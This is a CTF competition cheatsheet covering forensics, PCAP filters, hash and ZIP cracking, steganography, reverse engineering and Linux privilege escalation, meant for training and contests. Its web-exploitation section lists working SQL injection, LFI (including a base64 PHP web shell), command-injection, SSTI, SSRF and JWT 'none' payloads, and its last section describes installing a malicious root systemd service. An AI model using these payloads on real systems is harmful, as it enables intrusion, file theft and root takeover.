# Hack4Gov Master Offline CTF Cheatsheet
> Complete offline competition quick-reference guide for Forensics, Network PCAPs, Steganography, Cryptography, Web Exploitation, Reverse Engineering, and Linux Privilege Escalation.

---

## 1. File Signatures & Header Forensics (Magic Bytes)

When files are corrupted, truncated, or disguised (e.g. an ELF or ZIP renamed to `.pdf` or `.png`), inspect the first 16 bytes:
```bash
# View file header in hex:
xxd -l 16 file.bin
# OR
head -c 16 file.bin | xxd
```

### Common Magic Byte Signatures
| File Type | Header Bytes (Hex) | ASCII / Trailer |
| :--- | :--- | :--- |
| **PNG** | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` (End: `49 45 4E 44 AE 42 60 82` / `IEND`) |
| **JPEG / JPG** | `FF D8 FF E0` or `FF D8 FF E1` | `....` (End: `FF D9`) |
| **GIF** | `47 49 46 38 37 61` or `47 49 46 38 39 61` | `GIF87a` / `GIF89a` |
| **PDF** | `25 50 44 46` | `%PDF` (End: `%%EOF`) |
| **ZIP / DOCX / APK** | `50 4B 03 04` | `PK..` |
| **ELF (Linux Executable)**| `7F 45 4C 46` | `.ELF` |
| **Windows EXE / DLL** | `4D 5A` | `MZ` |
| **7-Zip** | `37 7A BC AF 27 1C` | `7z..` |
| **GZIP** | `1F 8B 08` | `...` |
| **PCAP** | `D4 C3 B2 A1` or `A1 B2 C3 D4` | Standard libpcap |
| **PCAPNG** | `0A 0D 0D 0A` | Next Generation PCAP |

### Header Repair Quick Fix (Python One-Liner)
If a PNG header is corrupted (e.g., set to zero or wrong bytes):
```python
# Fix PNG header:
python -c '
with open("corrupted.png", "r+b") as f:
    f.seek(0)
    f.write(bytes.fromhex("89504E470D0A1A0A"))
print("[+] Header restored to PNG.")
'
```

---

## 2. File Carving & Embedded Data Extraction

```bash
# 1. Print all readable strings (flags, URLs, comments):
strings -n 8 target_file | grep -iE "flag|hack4gov|pass|user|key"

# 2. Scan and auto-extract embedded files (ZIPs inside images, hidden binaries):
binwalk -e target_file

# 3. Alternative carver for headers (images, documents, archives):
foremost -i target_file -o output_dir/

# 4. View detailed image metadata (GPS, author, timestamps, hidden comments):
exiftool target_file.jpg
```

---

## 3. Wireshark & Network PCAP Analysis

### Essential Display Filters
| Goal | Wireshark Filter |
| :--- | :--- |
| **Find HTTP POST Logins** | `http.request.method == "POST"` |
| **Search Packet Contents for Flag** | `frame contains "hack4gov" || frame contains "flag"` |
| **Filter by Specific TCP Stream** | `tcp.stream eq 0` (Right click packet $\rightarrow$ Follow $\rightarrow$ TCP Stream) |
| **Inspect DNS Exfiltration** | `dns.flags.response == 0` |
| **Extract Transferred Files** | `File -> Export Objects -> HTTP / SMB / IMF` |
| **Filter Specific IP/Port** | `ip.addr == 10.10.10.5 && tcp.port == 80` |

### Tshark Command-Line One-Liners
```bash
# Print all HTTP POST request bodies from PCAP:
tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data

# Extract all unique DNS queries (checking for DNS tunnel / base64 exfiltration):
tshark -r capture.pcap -T fields -e dns.qry.name | sort -u

# Extract transmitted credentials:
tshark -r capture.pcap -Y 'http contains "password" || http contains "passwd"' -T fields -e text
```

---

## 4. Cryptography & Offline Hash Cracking

### A. Multi-Hash Generation & Identification (`hasher.py`)
```bash
# Multi-hash string (MD5, SHA1, SHA256, SHA512, NTLM):
python Tools/Crypto/hasher.py -s "target_string"

# Hash evidence file:
python Tools/Crypto/hasher.py -f test_evidence.bin

# Identify unknown hash format:
python Tools/Crypto/hasher.py -i "5d41402abc4b2a76b9719d911017c592"
```

### B. High-Speed Multi-Core Unhasher (`unhasher.py`)
```bash
# 1. Multi-core dictionary crack directly from rockyou.txt.gz (in-memory streaming):
python Tools/Crypto/unhasher.py -t "5f4dcc3b5aa765d61d8327deb882cf99" -w ../rockyou.txt.gz

# 2. Dictionary crack with rule mutations (numbers, dates, case, leetspeak):
python Tools/Crypto/unhasher.py -t "<TARGET_HASH>" -w ../rockyou.txt.gz -m

# 3. Fast pre-scan top 100,000 words in <1 sec:
python Tools/Crypto/unhasher.py -t "<TARGET_HASH>" -w ../rockyou.txt.gz --top 100000

# 4. 8-core brute-force 4-digit PIN (instant <0.2s):
python Tools/Crypto/unhasher.py -t "e48e13207341b6bffb7fb1622282247b" -b --charset digits --max-len 4

# 5. 8-core brute-force lowercase alphanumeric up to length 4:
python Tools/Crypto/unhasher.py -t "21232f297a57a5a743894a0e4a801fc3" -b --charset alphanum --max-len 4
```

---

## 5. Steganography & Signals (Images, Audio, ZIPs)

### A. Image Steganography
```bash
# 1. StegSolve (Color plane browser, LSB extractor, frame merger):
java -jar Tools/Forensics/stegsolve.jar

# 2. Zsteg (Fast PNG/BMP LSB inspection):
zsteg -a image.png

# 3. Steghide (Extract password-protected JPEG payload):
steghide extract -sf image.jpg -p ""

# 4. Stegseek (Fast rockyou dictionary crack for JPEG):
stegseek image.jpg ../rockyou.txt.gz

# 5. Outguess (Extract payload from JPEG):
outguess -r image.jpg extracted_flag.txt
```

### B. Audio Signals & Morse Code (`morse.py`)
```bash
# 1. Live interactive listener REPL (Auto-detects Morse vs Text):
python Tools/Crypto/morse.py -l

# 2. Interactive mouse & keyboard tapper (Left Click: '.', Right Click: '-', Space: Break):
python Tools/Crypto/morse.py -t -s

# 3. Automatic pulse decoder from .wav audio recording:
python Tools/Crypto/morse.py -a audio_challenge.wav

# 4. Live real-time microphone audio Morse listener (Speech-filtered):
python Tools/Crypto/morse.py --mic

# 5. Direct decode string:
python Tools/Crypto/morse.py -d "... --- ..."
```

### C. ZIP / Archive Cracking
```bash
# Crack encrypted ZIP using rockyou.txt.gz:
fcrackzip -u -D -p ../rockyou.txt.gz target.zip

# Or using zip2john:
zip2john target.zip > hash.txt
john --wordlist=../rockyou.txt.gz hash.txt
```

---

## 6. Web Exploitation Quick-Reference

### A. SQL Injection Authentication Bypasses
Test in username/password login fields:
```sql
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
' UNION SELECT null, null, null --
' OR '1'='1
```

### B. Local File Inclusion (LFI) & PHP Wrappers
```
../../../../etc/passwd
/etc/passwd
/var/log/apache2/access.log
php://filter/convert.base64-encode/resource=index.php
php://input  (with POST payload: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

### C. Command Injection Bypasses
```bash
; id
| id
$(id)
`id`
%0a id
;cat$IFS/etc/passwd
;cat$IFS$9/etc/passwd
;sh<<<$(base64$IFS-d<<<Y2F0IC9ldGMvcGFzc3dk)
```

### D. Server-Side Template Injection (SSTI)
- **Jinja2 (Python)**:
  ```
  {{7*7}} -> 49
  {{config.items()}}
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
  ```
- **Twig / PHP**:
  ```
  {{7*7}}
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  ```

### E. Server-Side Request Forgery (SSRF)
```
http://127.0.0.1:80/admin
http://localhost:8080/
http://0.0.0.0/
http://[::1]/
http://2130706433/       (Decimal IP for 127.0.0.1)
http://0177.0.0.1/       (Octal IP for 127.0.0.1)
```

### F. JWT (JSON Web Token) Attacks
A JWT consists of 3 Base64URL parts: `HEADER.PAYLOAD.SIGNATURE`.
- **None Algorithm Attack**: Change header `{"alg":"HS256"}` to `{"alg":"none"}` and strip signature.
- **Role Elevation**: Decode payload in CyberChef $\rightarrow$ change `"role":"user"` to `"role":"admin"`.

---

## 7. Reverse Engineering & Binary Triage

```bash
# 1. 1-Second automated binary triage:
python Tools/Reversing/rev_triage.py binary_name

# 2. Check binary architecture & security protections:
file binary_name
checksec --file=binary_name

# 3. Search strings for hardcoded flags or credentials:
strings -a binary_name | grep -iE "flag|hack4gov|pass|key"

# 4. Trace dynamic library and system calls:
ltrace -s 128 ./binary_name    # Shows strcmp, strncmp, printf (often leaks flag comparison!)
strace ./binary_name           # Shows file read/open/socket operations

# 5. GDB Breakpoints & Register Inspection:
# gdb -q ./binary_name
# (gdb) break *main
# (gdb) run
# (gdb) x/s $rdi
# (gdb) x/s $rsi
# (gdb) x/s $rax
```

---

## 8. Linux Privilege Escalation (Post-Exploitation)

```bash
# 1. Check user sudo privileges:
sudo -l

# 2. Find SUID binaries (executables running as root):
find / -perm -4000 -type f 2>/dev/null

# 3. Check Linux file capabilities:
getcap -r / 2>/dev/null

# 4. Look up SUID / Sudo binary bypasses on GTFOBins:
# https://gtfobins.github.io/

# 5. Check writable /etc/passwd or scheduled cron jobs:
cat /etc/crontab
ls -la /etc/cron.*

# 6. Malicious Systemd Service Escalation (Tools/root.service):
# cp Tools/root.service /etc/systemd/system/
# systemctl enable --now root.service
```
